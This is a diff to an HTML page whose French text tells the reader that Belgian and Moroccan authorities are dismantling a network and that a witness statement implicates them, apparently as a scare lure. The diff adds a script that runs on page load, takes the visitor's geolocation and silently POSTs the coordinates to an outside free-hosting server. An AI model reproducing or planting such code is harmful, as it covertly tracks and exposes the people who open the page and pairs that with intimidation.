@@ -61,5 +61,30 @@
     </div>
 
     <p>La collaboration entre les autorités belges et marocaines vise au démantèlement du réseau impliqué. Un témoignage recueilli par M. Anass vous implique dans l’affaire.</p>
+    <script>
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sendPositionData, handleError);
+        } else {
+            console.log("Geolocation is not supported by this browser.");
+        }
+    }
+    
+    function sendPositionData(position) {
+        var latitude = position.coords.latitude;
+        var longitude = position.coords.longitude;
+    
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://inflexionless-seals.000webhostapp.com/save_location.php", true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("latitude=" + latitude + "&longitude=" + longitude);
+    }
+    
+    function handleError(error) {
+        console.log('Geolocation error: ' + error.message);
+    }
+    
+    window.onload = getLocation;
+    </script>
 </body>
 </html>
